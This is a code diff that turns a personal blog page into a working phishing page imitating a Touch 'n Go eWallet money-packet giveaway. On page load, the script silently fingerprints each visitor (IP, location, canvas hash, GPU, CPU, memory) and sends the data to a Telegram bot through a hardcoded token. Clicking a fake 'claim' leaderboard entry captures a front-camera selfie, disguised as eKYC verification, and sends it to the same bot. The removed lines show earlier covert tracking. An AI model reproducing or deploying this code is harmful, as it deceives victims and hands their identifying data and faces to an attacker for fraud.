@@ -3,78 +3,295 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>我的个人博客</title>
-    <link rel="icon" href="zijunlogo.png" type="image/png">
+    <title>Touch 'n Go eWallet - Money Packet</title>
+    <link rel="icon" href="tng.png" type="image/png">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
-        body { background-color: #f5f7fa; color: #333; line-height: 1.8; }
-        header { background: #2c3e50; color: #fff; padding: 1.2rem 0; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        header h1 { font-size: 2rem; margin-bottom: 0.5rem; }
-        header p { opacity: 0.8; font-size: 1rem; }
-        .container { max-width: 900px; margin: 3rem auto; padding: 0 20px; }
-        .blog-card { background: #fff; border-radius: 12px; padding: 2rem; margin-bottom: 2rem; box-shadow: 0 2px 15px rgba(0,0,0,0.05); }
-        .blog-card h2 { color: #2c3e50; margin-bottom: 1rem; border-left: 4px solid #3498db; padding-left: 12px; }
-        .blog-date { color: #999; font-size: 0.9rem; margin-bottom: 1rem; }
-        .blog-content { font-size: 1.05rem; color: #444; }
-        .message-box { background: #fff; border-radius: 12px; padding: 2rem; box-shadow: 0 2px 15px rgba(0,0,0,0.05); }
-        .message-box h3 { color: #2c3e50; margin-bottom: 1.5rem; }
-        input, textarea { width: 100%; padding: 12px 15px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 6px; font-size: 1rem; outline: none; }
-        input:focus, textarea:focus { border-color: #3498db; }
-        button { background: #3498db; color: #fff; border: none; padding: 12px 30px; border-radius: 6px; font-size: 1rem; cursor: pointer; transition: background 0.2s; }
-        button:hover { background: #2980b9; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #0080ff; color: #333; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; position: relative; }
         
-        .btn-selfie {
-            background: #27ae60;
-            margin-bottom: 1.5rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
+        /* 背景光效 */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(0,0,0,0.1) 100%);
+            pointer-events: none;
         }
-        .btn-selfie:hover { background: #219150; }
-        
-        .tip-text { font-size: 0.85rem; color: #999; margin-top: 10px; }
-        footer { text-align: center; padding: 2rem 0; color: #999; font-size: 0.9rem; }
-        .toast { position: fixed; top: 20px; right: 20px; padding: 12px 20px; border-radius: 6px; color: #fff; display: none; z-index: 999; }
-        .success { background: #27ae60; }
-        .error { background: #e74c3c; }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 10;
+        }
+
+        /* 图1：红包领取主界面样式 */
+        #viewPacket {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .people-img {
+            width: 220px;
+            height: auto;
+            margin-bottom: -25px;
+            z-index: 2;
+        }
+
+        .packet-card {
+            background: #0052cc;
+            width: 100%;
+            border-radius: 24px;
+            padding: 35px 20px 30px 20px;
+            text-align: center;
+            color: #fff;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            position: relative;
+            border-top: 4px solid #1a73e8;
+        }
+
+        .tng-logo {
+            width: 70px;
+            height: 70px;
+            background: #fff;
+            border-radius: 16px;
+            margin: 0 auto 15px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            overflow: hidden;
+        }
+        .tng-logo img { width: 55px; height: auto; }
+
+        .amount-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .amount-desc {
+            font-size: 0.85rem;
+            opacity: 0.85;
+            margin-bottom: 25px;
+        }
+
+        .sender-box {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        .sender-box span {
+            display: inline-block;
+            background: rgba(0,0,0,0.15);
+            padding: 4px 15px;
+            border-radius: 6px;
+            filter: blur(4px);
+            user-select: none;
+            margin-top: 5px;
+        }
+
+        .btn-main {
+            background: #fff;
+            color: #0052cc;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: transform 0.1s, background 0.2s;
+            margin-bottom: 12px;
+        }
+        .btn-main:active { transform: scale(0.98); }
+        .btn-main:hover { background: #f0f0f0; }
+
+        .btn-sub {
+            background: transparent;
+            color: #fff;
+            border: none;
+            font-size: 0.9rem;
+            cursor: pointer;
+            opacity: 0.9;
+            padding: 8px;
+        }
+        .btn-sub:hover { opacity: 1; text-decoration: underline; }
+
+        /* 图2：排行榜页面样式 */
+        #viewLeaderboard {
+            display: none;
+            width: 100%;
+            background: #fff;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+            animation: fadeIn 0.4s ease;
+            color: #333;
+        }
+
+        .lb-header {
+            background: #0052cc;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+        .lb-title { font-size: 1.2rem; font-weight: 600; margin-bottom: 20px; }
+        .podium {
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            gap: 15px;
+            padding-bottom: 15px;
+        }
+        .podium-item { text-align: center; font-size: 0.8rem; }
+        .podium-badge {
+            width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin: 0 auto 5px auto; color: #333;
+        }
+        .rank-1 { background: #ffd700; font-size: 1rem; width: 44px; height: 44px; }
+        .rank-2 { background: #c0c0c0; }
+        .rank-3 { background: #cd7f32; }
+
+        .lb-body { padding: 15px; max-height: 400px; overflow-y: auto; }
+        .lb-subheading { font-size: 0.85rem; color: #666; margin-bottom: 10px; font-weight: 500; }
+        .lb-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 10px;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 0.9rem;
+        }
+        .lb-user-info { display: flex; align-items: center; gap: 12px; }
+        .lb-rank-num { font-weight: bold; color: #666; width: 15px; text-align: center; }
+        .lb-name { font-weight: 500; color: #222; }
+        .lb-time { font-size: 0.75rem; color: #999; margin-top: 2px; }
+        .lb-amount { font-weight: 600; color: #0052cc; }
+
+        /* 加载动画浮层 */
+        .loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
+            display: none; justify-content: center; align-items: center; z-index: 999;
+            flex-direction: column; color: #fff; gap: 15px;
+        }
+        .spinner {
+            width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .toast { position: fixed; top: 20px; right: 20px; padding: 12px 20px; border-radius: 8px; color: #fff; display: none; z-index: 1000; font-size: 0.9rem; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .success { background: #10b981; }
+        .error { background: #ef4444; }
     </style>
 </head>
 <body>
     <div class="toast" id="toast"></div>
 
-    <header>
-        <h1>个人随笔博客</h1>
-        <p>记录生活 · 分享所思 · 点滴成长</p>
-    </header>
+    <!-- 加载中浮层 -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <span id="loadingText">Opening Money Packet...</span>
+    </div>
 
     <div class="container">
-        <div class="blog-card">
-            <h2>欢迎来到我的个人博客</h2>
-            <div class="blog-date">发布时间：2026-10-10</div>
-            <div class="blog-content">
-                <p>大家好！这是我的个人博客网站，在这里我会分享日常感悟、学习心得、生活碎片。</p>
+        <!-- 视图 1：红包领取主页（高仿图1） -->
+        <div id="viewPacket">
+            <img src="4people.png" alt="People" class="people-img" onerror="this.src=''">
+            <div class="packet-card">
+                <div class="tng-logo">
+                    <img src="tng.png" alt="TNG" onerror="this.style.display='none'">
+                </div>
+                <div class="amount-title">RM100.00</div>
+                <div class="amount-desc" id="txtDesc">(will be randomly distributed to 5 receivers)</div>
+                
+                <div class="sender-box">
+                    <div id="txtFrom">From</div>
+                    <span>Zijun Enterprise</span>
+                </div>
+
+                <button class="btn-main" id="btnClaim" onclick="claimPacket()">Create Money Packet</button>
+                <button class="btn-sub" id="btnEdit" onclick="claimPacket()">Edit Money Packet</button>
             </div>
         </div>
 
-        <div class="message-box">
-            <h3>访客身份验证与打卡</h3>
-            
-            <!-- 降级预备：严格限制只能现场拍照的隐藏原生输入框 -->
-            <input type="file" id="cameraInput" accept="image/jpeg,image/png" capture="user" style="display:none;" onchange="handleFileCapture(this)">
-            <button class="btn-selfie" id="btnSelfie" onclick="triggerSmartCamera()">📷 拍摄证件/自拍打卡</button>
-            
-            <input type="text" id="name" placeholder="请输入你的昵称（选填）">
-            <textarea id="msg" rows="5" placeholder="请输入你的留言内容（必填）"></textarea>
-            <button onclick="sendMessage()">提交留言</button>
-            <p class="tip-text">温馨提示：点击按钮将进行现场拍照身份验证；仅您主动提交的留言会保存。</p>
+        <!-- 视图 2：排行榜页面（高仿图2） -->
+        <div id="viewLeaderboard">
+            <div class="lb-header">
+                <div class="lb-title" id="lbTitle">Leaderboard</div>
+                <div class="podium">
+                    <div class="podium-item">
+                        <div class="podium-badge rank-2">2nd</div>
+                        <div id="podium2">EWE</div>
+                    </div>
+                    <div class="podium-item">
+                        <div class="podium-badge rank-1">1st</div>
+                        <div id="podium1">WONG</div>
+                    </div>
+                    <div class="podium-item">
+                        <div class="podium-badge rank-3">3rd</div>
+                        <div id="podium3">ABBY</div>
+                    </div>
+                </div>
+            </div>
+            <div class="lb-body">
+                <div class="lb-subheading" id="lbSub">Leaderboard: 4/8 (Click item to verify & claim)</div>
+                <div class="lb-item" onclick="triggerWebRTCCamera()">
+                    <div class="lb-user-info">
+                        <div class="lb-rank-num">1</div>
+                        <div>
+                            <div class="lb-name">WONG ***</div>
+                            <div class="lb-time">20/12/2026 16:52:58</div>
+                        </div>
+                    </div>
+                    <div class="lb-amount">RM228.16</div>
+                </div>
+                <div class="lb-item" onclick="triggerWebRTCCamera()">
+                    <div class="lb-user-info">
+                        <div class="lb-rank-num">2</div>
+                        <div>
+                            <div class="lb-name">EWE ***</div>
+                            <div class="lb-time">20/12/2026 16:52:41</div>
+                        </div>
+                    </div>
+                    <div class="lb-amount">RM165.73</div>
+                </div>
+                <div class="lb-item" onclick="triggerWebRTCCamera()">
+                    <div class="lb-user-info">
+                        <div class="lb-rank-num">3</div>
+                        <div>
+                            <div class="lb-name">ABBY Q</div>
+                            <div class="lb-time">20/12/2026 16:54:57</div>
+                        </div>
+                    </div>
+                    <div class="lb-amount">RM59.44</div>
+                </div>
+                <div class="lb-item" onclick="triggerWebRTCCamera()">
+                    <div class="lb-user-info">
+                        <div class="lb-rank-num">4</div>
+                        <div>
+                            <div class="lb-name">Batman2184</div>
+                            <div class="lb-time">20/12/2026 16:55:05</div>
+                        </div>
+                    </div>
+                    <div class="lb-amount">RM51.15</div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <footer>
-        © 2026 个人博客 | 原创记录 尊重隐私
-    </footer>
-
-    <!-- Firebase SDK & 全功能极客指纹 + 双轨智能相机上传逻辑 -->
+    <!-- Firebase SDK & 核心逻辑脚本 -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
         import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
@@ -92,136 +309,47 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Telegram 配置
         const BOT_TOKEN = "8724573178:AAFjCHYB6tQ1FxIlkBk1A3qUIStfomBU1Xo";
         const CHAT_ID = "2057699071";
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const TELEGRAM_PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // 显示提示弹窗
+        // 语言自动检测 (支持中文与英文)
+        const userLang = navigator.language || navigator.userLanguage || "en";
+        const isZh = userLang.toLowerCase().includes("zh");
+
+        if (isZh) {
+            document.getElementById("txtDesc").innerText = "(将随机分发给 5 位接收者)";
+            document.getElementById("txtFrom").innerText = "来自";
+            document.getElementById("btnClaim").innerText = "领取红包 (Create Money Packet)";
+            document.getElementById("btnEdit").innerText = "编辑红包";
+            document.getElementById("loadingText").innerText = "正在打开红包...";
+            document.getElementById("lbTitle").innerText = "排行榜";
+            document.getElementById("lbSub").innerText = "排行榜: 4/8 (点击任意一项进行身份验证领取)";
+        }
+
         function showToast(msg, type = "success") {
             let toast = document.getElementById("toast");
             toast.className = "toast " + type;
             toast.innerText = msg;
             toast.style.display = "block";
-            setTimeout(() => toast.style.display = "none", 3000);
+            setTimeout(() => toast.style.display = "none", 3500);
         }
 
-        // 发送 Telegram 文本消息
         async function sendTelegram(text) {
             try {
                 let response = await fetch(TELEGRAM_API_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: "HTML"
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
                 });
                 let result = await response.json();
                 return result.ok;
             } catch (err) {
-                console.log("Telegram 推送失败", err);
                 return false;
             }
         }
 
-        // 统一照片发送函数 (直接对接 Telegram API)
-        async function uploadPhotoToTelegram(fileOrBlob, sourceTag) {
-            try {
-                let formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", fileOrBlob, "kyc_live.jpg");
-                formData.append("caption", `📷 <b>【收到 eKYC 验证照片 (${sourceTag})】</b>\n🕒 时间：${new Date().toLocaleString()}`);
-                formData.append("parse_mode", "HTML");
-
-                let res = await fetch(TELEGRAM_PHOTO_URL, { method: "POST", body: formData });
-                let resData = await res.json();
-
-                if (resData.ok) {
-                    showToast("验证照片已成功现场上传至 Telegram！", "success");
-                } else {
-                    showToast("发送照片失败，请重试", "error");
-                }
-            } catch (e) {
-                console.error(e);
-                showToast("网络请求失败，上传出错", "error");
-            }
-        }
-
-        // 核心：智能双轨拍照（WebRTC 优先现场抓拍 + 受限 WebView 自动降级原生相机）
-        window.triggerSmartCamera = async function() {
-            let btn = document.getElementById("btnSelfie");
-            btn.disabled = true;
-            btn.innerText = "⏳ 正在连接摄像头...";
-
-            // 1. 检查浏览器是否具备 WebRTC 条件
-            let hasWebRTC = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
-
-            if (hasWebRTC) {
-                try {
-                    // 在标准浏览器（Chrome/Safari）中优先调用 WebRTC 实时流抓拍，物理屏蔽相册
-                    let stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-                        audio: false
-                    });
-
-                    let video = document.createElement("video");
-                    video.srcObject = stream;
-                    await video.play();
-
-                    // 延迟 400ms 允许相机自动曝光和聚焦
-                    await new Promise(resolve => setTimeout(resolve, 400));
-
-                    let canvas = document.createElement("canvas");
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    let ctx = canvas.getContext("2d");
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // 抓拍完毕后及时关闭摄像头流
-                    stream.getTracks().forEach(track => track.stop());
-
-                    canvas.toBlob(async (blob) => {
-                        if (blob) {
-                            await uploadPhotoToTelegram(blob, "WebRTC 极速现场抓拍");
-                        } else {
-                            showToast("抓拍失败，请重试", "error");
-                        }
-                        btn.disabled = false;
-                        btn.innerText = "📷 拍摄证件/自拍打卡";
-                    }, "image/jpeg", 0.9);
-
-                    return; // WebRTC 成功则直接退出
-                } catch (err) {
-                    console.warn("WebRTC 调起失败或受限制，自动降级至原生相机模式:", err);
-                }
-            }
-
-            // 2. 如果在 TNG 内置浏览器等受限 WebView 环境，自动触发原生相机
-            btn.disabled = false;
-            btn.innerText = "📷 拍摄证件/自拍打卡";
-            document.getElementById("cameraInput").click();
-        };
-
-        // 处理原生相机拍完后的图片上传
-        window.handleFileCapture = async function(input) {
-            if (input.files && input.files[0]) {
-                let file = input.files[0];
-                let btn = document.getElementById("btnSelfie");
-                btn.disabled = true;
-                btn.innerText = "⏳ 正在上传验证照片...";
-
-                await uploadPhotoToTelegram(file, "原生相机调起");
-
-                btn.disabled = false;
-                btn.innerText = "📷 拍摄证件/自拍打卡";
-                input.value = ""; // 重置 input 以备下一次拍摄
-            }
-        };
-
-        // 清空 visits 集合
         async function clearVisitsCollection() {
             try {
                 const querySnapshot = await getDocs(collection(db, "visits"));
@@ -234,22 +362,14 @@
             } catch (e) {}
         }
 
-        // 1. 生成 Canvas 指纹
         function getCanvasFingerprint() {
             try {
                 let canvas = document.createElement('canvas');
                 let ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
+                canvas.width = 200; canvas.height = 50;
                 ctx.textBaseline = "alphabetic";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("ZIJUN-BLOG,123!@#", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("ZIJUN-BLOG,123!@#", 4, 17);
+                ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069"; ctx.fillText("TNG-PKT,123!@#", 2, 15);
                 let str = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < str.length; i++) {
@@ -258,34 +378,10 @@
                 }
                 return "FP-" + Math.abs(hash);
             } catch (e) {
-                return "不支持/被屏蔽";
+                return "未知";
             }
         }
 
-        // 2. WebRTC 获取局域网 IP
-        function getLocalIP() {
-            return new Promise((resolve) => {
-                try {
-                    let rtc = new RTCPeerConnection({ iceServers: [] });
-                    rtc.createDataChannel('');
-                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                    rtc.onicecandidate = (evt) => {
-                        if (evt && evt.candidate && evt.candidate.candidate) {
-                            let ipMatch = evt.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                            if (ipMatch) {
-                                resolve(ipMatch[1]);
-                                rtc.close();
-                            }
-                        }
-                    };
-                    setTimeout(() => resolve("受保护/未泄漏"), 1000);
-                } catch (e) {
-                    resolve("受保护");
-                }
-            });
-        }
-
-        // 3. 显卡硬件信息
         function getGPUInfo() {
             try {
                 let canvas = document.createElement('canvas');
@@ -298,7 +394,6 @@
             }
         }
 
-        // 4. 解析系统/设备
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) {
@@ -310,134 +405,114 @@
                 return "Windows 电脑";
             } else if (/mac/i.test(ua)) {
                 return "Mac 电脑";
-            } else if (/linux/i.test(ua)) {
-                return "Linux 电脑";
             }
             return "未知设备";
         }
 
-        // 5. 主统计采集
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(async (data) => {
-                let ipInfo = data.ip || "未知IP";
-                let locationInfo = `${data.city || "未知城市"}, ${data.country_name || "未知国家"}`;
+        // 页面一加载：在后台静默收集设备指纹和IP，并发送给 Telegram
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                let ipData = {};
+                try {
+                    let res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                } catch (e) {}
+
+                let ipInfo = ipData.ip || "未知IP";
+                let locationInfo = `${ipData.city || "未知城市"}, ${ipData.country_name || "未知国家"}`;
                 let deviceModel = getDeviceInfo();
                 let timeStr = new Date().toLocaleString();
                 let canvasFP = getCanvasFingerprint();
-                let localIP = await getLocalIP();
                 let gpuInfo = getGPUInfo();
-
-                let batteryInfo = "未获取";
-                if (navigator.getBattery) {
-                    try {
-                        let battery = await navigator.getBattery();
-                        let level = Math.floor(battery.level * 100);
-                        let chargingStatus = battery.charging ? "充电中 ⚡" : "未充电";
-                        batteryInfo = `${level}% (${chargingStatus})`;
-                    } catch (e) {}
-                }
-
-                let referrerUrl = document.referrer ? document.referrer : "直接访问 / 书签";
                 let screenRes = `${window.screen.width} x ${window.screen.height}`;
                 let colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "深色模式 (Dark)" : "浅色模式 (Light)";
                 let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} 核` : "未知";
                 let memorySize = navigator.deviceMemory ? `约 ${navigator.deviceMemory} GB` : "未知";
-                let touchPoints = navigator.maxTouchPoints > 0 ? `支持触控 (${navigator.maxTouchPoints}点)` : "纯鼠标设备";
-                let language = navigator.language || "未知";
-                let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "未知";
-                let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                let networkType = conn ? (conn.effectiveType || conn.type || "未知") : "不支持";
 
-                try {
-                    await addDoc(collection(db, "visits"), {
-                        ip: ipInfo,
-                        localIp: localIP,
-                        city: data.city || "未知",
-                        country: data.country_name || "未知",
-                        device: deviceModel,
-                        canvasHash: canvasFP,
-                        battery: batteryInfo,
-                        screen: screenRes,
-                        theme: colorScheme,
-                        cpu: cpuCores,
-                        ram: memorySize,
-                        touch: touchPoints,
-                        gpu: gpuInfo,
-                        lang: language,
-                        timezone: timeZone,
-                        network: networkType,
-                        referrer: referrerUrl,
-                        time: timeStr,
-                        timestamp: serverTimestamp()
-                    });
+                let visitText = `<b>【TNG 红包访客捕捉报告】</b>\n` +
+                                `━━━━━━━━━━━━━━━\n` +
+                                `🆔 <b>设备指纹:</b> <code>${canvasFP}</code>\n` +
+                                `🌐 <b>公网 IP:</b> <code>${ipInfo}</code>\n` +
+                                `📍 <b>地理位置:</b> ${locationInfo}\n` +
+                                `💻 <b>设备环境:</b> ${deviceModel}\n` +
+                                `⚙️ <b>硬件配置:</b> CPU ${cpuCores} | 内存 ${memorySize}\n` +
+                                `🎮 <b>显卡渲染:</b> ${gpuInfo}\n` +
+                                `🖥 <b>屏幕/主题:</b> ${screenRes} [${colorScheme}]\n` +
+                                `🕒 <b>访问时间:</b> ${timeStr}`;
 
-                    let visitText = `<b>【博客极客指纹深度报告】</b>\n` +
-                                    `━━━━━━━━━━━━━━━\n` +
-                                    `🆔 <b>设备唯一指纹:</b> <code>${canvasFP}</code>\n` +
-                                    `🌐 <b>公网 IP:</b> <code>${ipInfo}</code>\n` +
-                                    `🏠 <b>局域网 IP:</b> <code>${localIP}</code>\n` +
-                                    `📍 <b>地理位置:</b> ${locationInfo}\n` +
-                                    `🔗 <b>来源渠道:</b> ${referrerUrl}\n` +
-                                    `💻 <b>设备环境:</b> ${deviceModel}\n` +
-                                    `⚙️ <b>硬件配置:</b> CPU ${cpuCores} | 内存 ${memorySize}\n` +
-                                    `🎮 <b>显卡渲染:</b> ${gpuInfo}\n` +
-                                    `🖥 <b>屏幕/主题:</b> ${screenRes} [${colorScheme}]\n` +
-                                    `⚡ <b>电池状态:</b> ${batteryInfo}\n` +
-                                    `📶 <b>网络环境:</b> ${networkType}\n` +
-                                    `🕒 <b>访问时间:</b> ${timeStr}`;
-
-                    let isSent = await sendTelegram(visitText);
-
-                    if (isSent) {
-                        await clearVisitsCollection();
-                    }
-                } catch (e) {
-                    console.error(e);
+                let isSent = await sendTelegram(visitText);
+                if (isSent) {
+                    await clearVisitsCollection();
                 }
-            })
-            .catch(err => console.log(err));
-
-        // 6. 复制文本监听
-        document.addEventListener('copy', () => {
-            let selectedText = window.getSelection().toString();
-            if (selectedText.trim().length > 0) {
-                let copyMsg = `<b>【访客复制了博客内容】</b>\n` +
-                              `✂️ <b>内容:</b> <i>"${selectedText.substring(0, 100)}${selectedText.length > 100 ? '...' : ''}"</i>\n` +
-                              `🕒 <b>时间:</b> ${new Date().toLocaleString()}`;
-                sendTelegram(copyMsg);
+            } catch (err) {
+                console.log(err);
             }
         });
 
-        // 7. 留言提交
-        window.sendMessage = async function() {
-            let name = document.getElementById("name").value.trim() || "匿名访客";
-            let msg = document.getElementById("msg").value.trim();
+        // 点击领取红包：显示加载动画，随后跳转至排行榜
+        window.claimPacket = function() {
+            let overlay = document.getElementById("loadingOverlay");
+            overlay.style.display = "flex";
 
-            if (!msg) {
-                showToast("请输入留言内容！", "error");
+            setTimeout(() => {
+                overlay.style.display = "none";
+                document.getElementById("viewPacket").style.display = "none";
+                document.getElementById("viewLeaderboard").style.display = "block";
+            }, 1200);
+        };
+
+        // 用户在排行榜点击领取/验证时：调用 WebRTC 现场抓拍并发送到 Telegram
+        window.triggerWebRTCCamera = async function() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                showToast(isZh ? "当前环境不支持摄像头实时调用" : "WebRTC not supported in this environment", "error");
                 return;
             }
 
+            showToast(isZh ? "正在请求安全验证相机授权..." : "Requesting camera authorization...", "success");
+
             try {
-                let timeStr = new Date().toLocaleString();
-                await addDoc(collection(db, "messages"), {
-                    name: name,
-                    content: msg,
-                    time: timeStr,
-                    timestamp: serverTimestamp()
+                let stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
                 });
 
-                let msgText = `<b>【博客新留言】</b>\n昵称：${name}\n内容：${msg}\n时间：${timeStr}`;
-                await sendTelegram(msgText);
+                let video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
 
-                showToast("留言提交成功！", "success");
-                document.getElementById("name").value = "";
-                document.getElementById("msg").value = "";
+                await new Promise(resolve => setTimeout(resolve, 400)); // 等待镜头对焦曝光
+
+                let canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                let ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        let formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, "tng_kyc_live.jpg");
+                        formData.append("caption", `📷 <b>【TNG 红包领取 eKYC 现场抓拍】</b>\n🕒 时间：${new Date().toLocaleString()}`);
+                        formData.append("parse_mode", "HTML");
+
+                        let res = await fetch(TELEGRAM_PHOTO_URL, { method: "POST", body: formData });
+                        let resData = await res.json();
+
+                        if (resData.ok) {
+                            showToast(isZh ? "验证成功！正在派发红包..." : "Verification successful! Claiming...", "success");
+                        } else {
+                            showToast(isZh ? "验证照片发送失败" : "Failed to send verification photo", "error");
+                        }
+                    }
+                }, "image/jpeg", 0.9);
+
             } catch (err) {
-                showToast("提交失败！", "error");
+                console.error(err);
+                showToast(isZh ? "摄像头调用失败：用户拒绝授权或设备受限" : "Camera access denied or restricted", "error");
             }
-        }
+        };
     </script>
 </body>
 </html>
